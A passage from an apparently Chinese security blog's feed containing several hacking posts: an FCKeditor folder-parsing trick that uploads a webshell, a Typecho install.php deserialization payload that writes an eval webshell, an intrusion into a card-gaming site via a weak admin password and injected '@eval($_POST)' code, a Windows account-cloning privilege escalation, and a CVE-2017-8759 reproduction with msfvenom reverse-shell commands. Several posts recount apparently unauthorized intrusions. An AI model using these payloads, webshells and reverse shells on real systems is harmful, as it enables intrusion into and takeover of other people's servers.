src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/23.png" alt="毫无技术含量的一次渗透"><br>那就上解析漏洞吧<br>创建一个 ice.asp 的文件夹</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/24.png" alt="毫无技术含量的一次渗透"><br>我擦，变下划线了</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/25.png" alt="毫无技术含量的一次渗透"><br>淡定，我记得这个是可以突破的….<br>构造下语句</p><p><code>  FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/ice.asp&amp;NewFolderName=x.asp</code></p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/26.png" alt="毫无技术含量的一次渗透"></p><p>成功建立了<br>亮出我们的一句话</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/27.png" alt="毫无技术含量的一次渗透"></p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/28.png" alt="毫无技术含量的一次渗透"><br>上传成功，查看下文件</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/29.png" alt="毫无技术含量的一次渗透"><br>构造下路径访问</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/30.png" alt="毫无技术含量的一次渗透"><br>来啊，互相伤害啊</p><p><img src="/images/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/31.png" alt="毫无技术含量的一次渗透"></p><p>突然想到，这种站怎么可能会有妹子资料，算了算了，提不起兴趣了。删马走人…….<br>此文没有任何技术含量。只是双十一屌丝蛋疼打发时间而已！！勿喷</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho install.php 反序列化导致任意代码执行</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Typecho-install-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Typecho-install-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html</url>
    
    <content type="html"><![CDATA[<h1 id="什么是Typecho？"><a href="#什么是Typecho？" class="headerlink" title="什么是Typecho？"></a>什么是Typecho？</h1><p>Typecho 是一款博客程序，它在 GPL version 2 许可证下发行，基于 PHP (需要 PHP5 以上版本)构建,可以运行在各种平台上，支持多种数据库(Mysql, PostgreSQL, SQLite)，在国内使用较广。</p><h1 id="影响的版本"><a href="#影响的版本" class="headerlink" title="影响的版本"></a>影响的版本</h1><p>GitHub上2017年10月24日之前的所以版本。</p><a id="more"></a><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /typecho/install.php?finish=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.127</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">12</span>; rv:<span class="hljs-number">55</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">55</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: __typecho_config=YToyOntzOjc<span class="hljs-number">6</span>ImFkYXB<span class="hljs-number">0</span>ZXIiO<span class="hljs-number">086</span>MTI<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZCI<span class="hljs-number">6</span>NDp<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfdHlwZSI<span class="hljs-number">7</span>czo<span class="hljs-number">4</span>OiJBVE<span class="hljs-number">9</span>NIDEuMCI<span class="hljs-number">7</span>czoyMjoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfY<span class="hljs-number">2</span>hhcnNldCI<span class="hljs-number">7</span>czo<span class="hljs-number">1</span>OiJVVEYtOCI<span class="hljs-number">7</span>czoxOToiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfbGFuZyI<span class="hljs-number">7</span>czoyOiJ<span class="hljs-number">6</span>aCI<span class="hljs-number">7</span>czoyMDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fRmVlZABfaXRlbXMiO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>aTowO<span class="hljs-number">2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhdXRob<span class="hljs-number">3</span>IiO<span class="hljs-number">086</span>MTU<span class="hljs-number">6</span>IlR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdCI<span class="hljs-number">6</span>Mjp<span class="hljs-number">7</span>czoyNDoiAFR<span class="hljs-number">5</span>cGVjaG<span class="hljs-number">9</span>fUmVxdWVzdABfcGFyYW<span class="hljs-number">1</span>zIjthOjE<span class="hljs-number">6</span>e<span class="hljs-number">3</span>M<span class="hljs-number">6</span>MTA<span class="hljs-number">6</span>InNjcmVlbk<span class="hljs-number">5</span>hbWUiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NTc<span class="hljs-number">6</span>ImZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span>NvbnRlbnRzKCdwMC<span class="hljs-number">5</span>waHAnLCAnPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUW<span class="hljs-number">3</span>AwXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>nKSI<span class="hljs-number">7</span>fXM<span class="hljs-number">6</span>MjQ<span class="hljs-number">6</span>IgBUeXBlY<span class="hljs-number">2</span>hvX<span class="hljs-number">1</span>JlcXVlc<span class="hljs-number">3</span>QAX<span class="hljs-number">2</span>ZpbHRlciI<span class="hljs-number">7</span>YToxOntpOjA<span class="hljs-number">7</span>czo<span class="hljs-number">2</span>OiJhc<span class="hljs-number">3</span>NlcnQiO<span class="hljs-number">319</span>fX<span class="hljs-number">19</span>czo<span class="hljs-number">2</span>OiJwcmVmaXgiO<span class="hljs-number">3</span>M<span class="hljs-number">6</span>NzoidHlwZWNobyI<span class="hljs-number">7</span>fQ==<span class="hljs-attribute">Referer</span>:http://<span class="hljs-number">192.168.0.127</span>/typecho/install.php<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们先去typecho官网下载套源码在本地搭建个环境</p><p>搭建过程就不多说了，自己百度</p><p>搭建好后我们访问首页看看</p><p>![Typecho install.php 反序列化导致任意代码执行](/images/20171024_Typecho install.php 反序列化导致任意代码执行/01.png)</p><p>接下来我们打开burp设置好代理，访问<a href="http://192.168.0.127/typecho/install.php?finish=1">http://192.168.0.127/typecho/install.php?finish=1</a> （将ip换成自己的ip），然后把包拦截，将http协议修改成我们的payload。</p><p>![Typecho install.php 反序列化导致任意代码执行](/images/20171024_Typecho install.php 反序列化导致任意代码执行/02.png)</p><p>然后放包，网站根目录下就生成了一句话马。</p><p>![Typecho install.php 反序列化导致任意代码执行](/images/20171024_Typecho install.php 反序列化导致任意代码执行/03.png)</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Typecho</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陪妹子玩游戏引起的风波</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2.html</url>
    
    <content type="html"><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。<br>然后发了我一个app，我安装以后打开一看。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/01.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，XXXX四个打字出现在我眼前<br>不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去…..)<br>祖国的生日结束以后…..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: <a href="http://xxxx.com/">http://xxxx.com/</a>。</p><h3 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h3><p>简单的搜集了下信息如下:<br>IP: XXX.XXX.XX.XX<br>旁站:无<br>cdn:无<br>脚本:php<br>中间件:nginx<br>框架:ThinkPHP<br>cms:vlcms</p><p>可以判断出服务器架构是:php+mysql+nginx+linux</p><h3 id="进后台"><a href="#进后台" class="headerlink" title="进后台"></a>进后台</h3><p>说到这个后台嘛…….很蛋疼，想说点啥，太丢人了，还是不说了吧！！！（知道了cms，先百度网上公开的漏洞，这里毛都没有……）<br>在url后面加上admin.php，会跳转到登录界面<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/02.png" alt="陪妹子玩游戏引起的风波"><br>测试了下弱口令(人品爆发)<br>admin   admin    失败<br>admin   123456   成功<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/03.png" alt="陪妹子玩游戏引起的风波"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>老规矩，知道cms先百度，一样，毛都没……<br>只能硬着头皮在后台翻了…..<br>这里admin用户权限已经是属于超级管理员了，权限是最高的了。<br>还有个数据库备份和用户配置<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/04.png" alt="陪妹子玩游戏引起的风波"><br>不过数据库是mysql的…..没屌用啊，此处感慨为啥不学学南方。<br>剩下的就是上传点了<br>上传点有点多，随便找了个上传点<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/05.png" alt="陪妹子玩游戏引起的风波"><br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/06.png" alt="陪妹子玩游戏引起的风波"><br>先上传张正常的图片看下上传功能是否有用<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/07.png" alt="陪妹子玩游戏引起的风波"><br>看来是能正常上传的，然后直接上传php脚本，弹了个框框（以为是js验证，禁用js后还是没用）<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/08.png" alt="陪妹子玩游戏引起的风波"><br>然后各种上传绕过都试了，也是没用。</p><h3 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h3><p>看来上传这条路是死了，翻了翻超级管理员的访问授权，看下还有哪些功能<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/09.png" alt="陪妹子玩游戏引起的风波"><br>扩展管理？后台并没有找到这个地方，莫非是阉割版？？？（后来土豆找到了这个地方）<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/10.png" alt="陪妹子玩游戏引起的风波"><br>修改url为<a href="http://xxxx.com/admin.php?s=/Addons/index">http://xxxx.com/admin.php?s=/Addons/index</a>，然后访问<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/11.png" alt="陪妹子玩游戏引起的风波"><br>和土豆研究了下这个插件，先点击快速创建<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/12.png" alt="陪妹子玩游戏引起的风波"><br>点击预览按钮可以看到代码。。。。。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/13.png" alt="陪妹子玩游戏引起的风波"><br>竟然能看到代码？这不是脱裤子找日吗？<br>思路：打算在这里写入一句话。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/14.png" alt="陪妹子玩游戏引起的风波"><br>顺手写了个一句话，然后点击预览发现被注释了。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/15.png" alt="陪妹子玩游戏引起的风波"><br>看来是有用的，那就好办了，闭合下注释和php末端。<br>最后的代码是**/?&gt; <?php @eval($_POST["a"]);?> &lt;?php /*<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/16.png" alt="陪妹子玩游戏引起的风波"><br>Ok，这样我们的一句话就写进去了。然后点击确定<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/17.png" alt="陪妹子玩游戏引起的风波"><br>卧槽，好激动。。。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/18.png" alt="陪妹子玩游戏引起的风波"><br>可是tm的地址呢？？？不过可以肯定的是，马是写进去了。<br>然后我又创建了一个插件，这次不打算完整闭合代码。<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/19.png" alt="陪妹子玩游戏引起的风波"><br>这样肯定是出错的，然后我们点击确定<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/20.png" alt="陪妹子玩游戏引起的风波"><br>没错，正如你所见，报错了。刚才创建的名叫test1。<br>然后构造下我们之前创建名为Example的路径<br>地址为: <a href="http://xxxx.com/Addons/Example/ExampleAddon.class.php">http://xxxx.com/Addons/Example/ExampleAddon.class.php</a><br>然后请出菜刀，连接看看<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/21.png" alt="陪妹子玩游戏引起的风波"><br>连接成功，成功获取shell。<br>由于服务器Linux服务器我就不去提权了。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>这种棋牌网站，竟然来了，怎么能不留点东西呢<br>丢个txt文件走人<br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/22.png" alt="陪妹子玩游戏引起的风波"><br><img src="/images/20171017_%E9%99%AA%E5%A6%B9%E5%AD%90%E7%8E%A9%E6%B8%B8%E6%88%8F%E5%BC%95%E8%B5%B7%E7%9A%84%E9%A3%8E%E6%B3%A2/23.png" alt="陪妹子玩游戏引起的风波"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次System权限下的过狗提权</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83.html</url>
    
    <content type="html"><![CDATA[<p>事情起因:某个朋友有个phpmyadmin的站拿不下shell。</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/01.png" alt="记一次System权限下的过狗提权"></p><a id="more"></a><p>拿shell的过程就不多说了，因为是用phpstudy搭建的站点(一般采用集成包搭建的都是system权限)，所以权限挺大的</p><p>首先看了下权限</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/02.png" alt="记一次System权限下的过狗提权"></p><p>确定是system，直接net user添加帐号</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/03.png" alt="记一次System权限下的过狗提权"></p><p>然后加入到管理组</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/04.png" alt="记一次System权限下的过狗提权"></p><p>拒绝访问。。。。查看下是不是有WAF</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/05.png" alt="记一次System权限下的过狗提权"></p><p>确定已经有安全狗了….竟然帐号添加了  但是没办法加入管理组</p><p>这时候y哥对我说直接克隆用户</p><p>然后上传exp</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/06.png" alt="记一次System权限下的过狗提权"></p><p>执行下，显示克隆成功。</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/07.png" alt="记一次System权限下的过狗提权"></p><p>去查看下有没有开放3389</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/08.png" alt="记一次System权限下的过狗提权"></p><p>这里并没有显示3389端口，竟然这样，我们就去查看下他改成什么端口了(不过这里基本上就可以看出端口是3390了…..)</p><p>首先用tasklist /svc查看下服务，找到这个服务对应的PID号</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/09.png" alt="记一次System权限下的过狗提权"></p><p>然后用netstat –ano查看对应的端口</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/10.png" alt="记一次System权限下的过狗提权"></p><p>可以看出端口是3390，然后我们去连接下</p><p><img src="/images/20170930_%E8%AE%B0%E4%B8%80%E6%AC%A1System%E6%9D%83%E9%99%90%E4%B8%8B%E7%9A%84%E8%BF%87%E7%8B%97%E6%8F%90%E6%9D%83/11.png" alt="记一次System权限下的过狗提权"></p><p>一连接上就自动登录QQ，屎都差点吓出来……….</p><p>以前写的一篇文章，没啥技术含量，此文只是做次笔记</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-8759漏洞复现</title>
    <link href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <url>/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
    
    <content type="html"><![CDATA[<p>漏洞介绍:<a href="http://www.freebuf.com/articles/system/147602.html">http://www.freebuf.com/articles/system/147602.html</a></p><p>贴上POC地址:<a href="https://github.com/bhdresh/CVE-2017-8759">https://github.com/bhdresh/CVE-2017-8759</a></p><p>由于kali2.0太卡，已被我抛弃，目前使用parrot系统。</p><p>先用命令将POC下载到本地</p><p><code>git clone https://github.com/bhdresh/CVE-2017-8759</code></p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/01.png" alt="CVE-2017-8759漏洞复现"></p><a id="more"></a><p>我们进入到CVE-2017-8759这个文件夹，打开README.md文件查看下使用方法</p><p><code>sudo pluma README.md</code></p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/02.png" alt="CVE-2017-8759漏洞复现"></p><pre><code class="hljs markdown"><span class="hljs-section">###### Example commands</span><span class="hljs-code">1) Generate malicious RTF file</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.txt</span><span class="hljs-code">2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler</span><span class="hljs-code">   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe &gt; /tmp/shell.exe</span><span class="hljs-code">   # msfconsole -x &quot;use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run&quot;</span><span class="hljs-code">3) Start toolkit in exploit mode to deliver local payload</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe</span></code></pre><p>我们先用命令<code>python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.0.124/test.txt</code>生成一个恶意的RTF文件(先用ifconfig命令查看下自己的IP，将里面的IP修改为自己的IP，我这里是192.168.0.124)</p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/03.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到生成成功了，我们ls看下是否有这个文件</p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/04.png" alt="CVE-2017-8759漏洞复现"></p><p>然后第二步，用msf生成Payload。</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=你监听的端口 -f exe &gt; /tmp/shell.exe</code></p><p><img src="/images/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/05.png" alt="CVE-2017-8759漏洞复现"></p><p>然后用msfconsole启动msf，需要等待些时间。</p><p>等启动好后我们配置下msf</p><pre><code class="hljs gams">msf &gt; use exploit/multi/handler msf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>[-] The <span class="hljs-comment">value specified for payload is not valid.</span>msf <span class="hljs-comment">exploit(handler) &gt; set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST                      <span class="hljs-comment">yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; set lhost 192.168.0.124</span>lhost <span class="hljs-comment">=&gt; 192.168.0.124</span>msf <span class="hljs-comment">exploit(handler) &gt; set lport 4444</span>lport <span class="hljs-comment">=&gt; 4444</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span 